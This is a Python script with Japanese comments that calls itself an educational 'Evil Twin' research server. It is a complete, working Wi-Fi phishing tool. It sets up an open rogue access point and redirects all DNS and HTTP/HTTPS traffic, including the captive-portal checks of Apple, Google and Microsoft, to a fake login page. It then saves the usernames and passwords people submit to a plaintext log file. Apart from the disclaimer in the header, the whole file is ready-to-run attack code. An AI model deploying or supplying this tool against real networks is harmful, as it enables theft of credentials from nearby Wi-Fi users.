#!/usr/bin/env python3
"""
Evil Twin研究用サーバー - 教育目的専用
許可されたラボ環境でのみ使用してください

用途:
- Wi-Fiセキュリティ研究
- Captive Portal攻撃の防御策研究
- 許可されたネットワーク環境でのテスト
"""

import os
import signal
import time
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

# 設定
INTERFACE = "wlan0"
EVIL_TWIN_SSID = "Research_Wifi"
CHANNEL = "6"
LOG_FILE = "stolen_test_credentials.txt"
PORT = 80

# グローバル変数
HOSTAPD_PID = None
DNSMASQ_PID = None
HTTPD = None

CAPTIVE_PORTAL_HTML = f"""
<!DOCTYPE html>
<html>
<head><title>Wi-Fi 認証テスト</title></head>
<body>
    <h1>研究用 Wi-Fi接続には認証が必要です</h1>
    <p>防御策を研究するためのテストログインページです。</p>
    <form method="POST">
        <label for="username">テストユーザー名:</label><br>
        <input type="text" id="username" name="username" required><br><br>
        <label for="password">テストパスワード:</label><br>
        <input type="password" id="password" name="password" required><br><br>
        <input type="submit" value="接続 (データ送信)">
    </form>
</body>
</html>
"""

def cleanup():
    """設定とサービスをリセットする"""
    print("\nクリーンアップ中...")
    
    if HTTPD:
        print("HTTPサーバー停止")
        HTTPD.server_close()
        
    for pid, name in [(HOSTAPD_PID, "hostapd"), (DNSMASQ_PID, "dnsmasq")]:
        if pid:
            try:
                os.kill(pid, signal.SIGTERM)
                print(f"{name} (PID: {pid})を停止")
            except OSError:
                print(f"{name} は既に停止済みか、存在しません")

    print("システム設定をリセット")
    subprocess.run(["iptables", "-t", "nat", "-F"], check=False)
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], check=False)
    
    subprocess.run(["ifconfig", INTERFACE, "down"], check=False)
    subprocess.run(["iwconfig", INTERFACE, "mode", "Managed"], check=False, stderr=subprocess.DEVNULL) 
    subprocess.run(["ifconfig", INTERFACE, "up"], check=False)

    subprocess.run(["systemctl", "start", "NetworkManager"], check=False, stderr=subprocess.DEVNULL)
    subprocess.run(["systemctl", "start", "wpa_supplicant"], check=False, stderr=subprocess.DEVNULL)
    subprocess.run(["systemctl", "start", "dhcpcd"], check=False, stderr=subprocess.DEVNULL)
    
    print("すべてのリソースをリセットしました。")

def setup_network():
    """ネットワークインターフェースとIPTABLESを設定し、hostapd/dnsmasqを起動する"""
    global HOSTAPD_PID, DNSMASQ_PID
    
    print("ネットワーク管理サービスを停止中...")
    subprocess.run(["systemctl", "stop", "NetworkManager"], check=False, stderr=subprocess.DEVNULL)
    subprocess.run(["systemctl", "stop", "wpa_supplicant"], check=False, stderr=subprocess.DEVNULL)
    subprocess.run(["systemctl", "stop", "dhcpcd"], check=False, stderr=subprocess.DEVNULL)

    print("ネットワークインターフェース設定中...")
    subprocess.run(["ifconfig", INTERFACE, "down"], check=True)
    subprocess.run(["ifconfig", INTERFACE, "10.0.0.1", "netmask", "255.255.255.0", "up"], check=True)
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)

    HOSTAPD_CONF = "/tmp/hostapd_combined.conf"
    print(f"hostapd設定ファイル生成: {HOSTAPD_CONF}")
    hostapd_content = f"""
interface={INTERFACE}
driver=nl80211
ssid={EVIL_TWIN_SSID}
channel={CHANNEL}
hw_mode=g
wpa=0
country_code=JP
ieee80211d=1
"""
    with open(HOSTAPD_CONF, 'w') as f:
        f.write(hostapd_content.strip())

    DNSMASQ_CONF = "/tmp/dnsmasq_combined.conf"
    print(f"dnsmasq設定ファイル生成: {DNSMASQ_CONF}")
    dnsmasq_content = f"""
interface={INTERFACE}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
log-dhcp
address=/#/10.0.0.1
address=/apple.com/10.0.0.1
address=/captive.apple.com/10.0.0.1
address=/www.apple.com/10.0.0.1
address=/connectivitycheck.gstatic.com/10.0.0.1
address=/clients3.google.com/10.0.0.1
address=/msftconnecttest.com/10.0.0.1
"""
    with open(DNSMASQ_CONF, 'w') as f:
        f.write(dnsmasq_content.strip())
        
    print("iptables リダイレクトルール設定中...")
    subprocess.run(["iptables", "-t", "nat", "-F"], check=True)
    
    subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", INTERFACE, 
                    "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", 
                    f"10.0.0.1:{PORT}"], check=True)
    
    subprocess.run(["iptables", "-t", "nat", "-A", "PREROUTING", "-i", INTERFACE, 
                    "-p", "tcp", "--dport", "443", "-j", "DNAT", "--to-destination", 
                    f"10.0.0.1:{PORT}"], check=True)
    
    print("hostapd と dnsmasq をバックグラウンドで起動中...")
    
    hostapd_proc = subprocess.Popen(["hostapd", HOSTAPD_CONF], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    HOSTAPD_PID = hostapd_proc.pid
    print(f"hostapd 起動 (PID: {HOSTAPD_PID})")
    
    dnsmasq_proc = subprocess.Popen(["dnsmasq", "-C", DNSMASQ_CONF], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    DNSMASQ_PID = dnsmasq_proc.pid
    print(f"dnsmasq 起動 (PID: {DNSMASQ_PID})")
    
    time.sleep(2)
    print("=" * 50)
    print("Evil Twin 環境セットアップ完了")
    print("=" * 50)
    print(f"SSID: {EVIL_TWIN_SSID}")
    print(f"Webサーバー起動中...")

class CaptivePortalHandler(BaseHTTPRequestHandler):
    
    def log_message(self, format, *args):
        return

    def do_GET(self):
        """GETリクエストが来た場合、偽のログインページを表示"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(CAPTIVE_PORTAL_HTML.encode('utf-8'))

    def do_POST(self):
        """POSTリクエスト（フォーム送信）が来た場合、データを記録しリダイレクト"""
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        params = parse_qs(post_data)
        
        timestamp = time.strftime('[%Y-%m-%d %H:%M:%S]')
        username = params.get('username', ['N/A'])[0]
        password = params.get('password', ['N/A'])[0]
        
        log_entry = f"{timestamp} USER: {username} PASS: {password}\n"
        
        with open(LOG_FILE, 'a') as f:
            f.write(log_entry)
        
        print(f"\n捕捉されたデータ USER: {username}, PASS: {password}")

        self.send_response(302)
        self.send_header('Location', 'https://www.google.com')
        self.end_headers()
        
def run_server():
    """Webサーバーを起動する"""
    global HTTPD
    server_address = ('0.0.0.0', PORT)
    HTTPD = HTTPServer(server_address, CaptivePortalHandler)
    HTTPD.serve_forever()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("エラー: このスクリプトは管理者権限 (sudo) で実行する必要があります。")
        exit(1)
        
    signal.signal(signal.SIGINT, lambda s, f: (cleanup(), exit(0)))
    
    try:
        setup_network()
        run_server()
    except Exception as e:
        print(f"\n致命的なエラー: {e}")
        cleanup()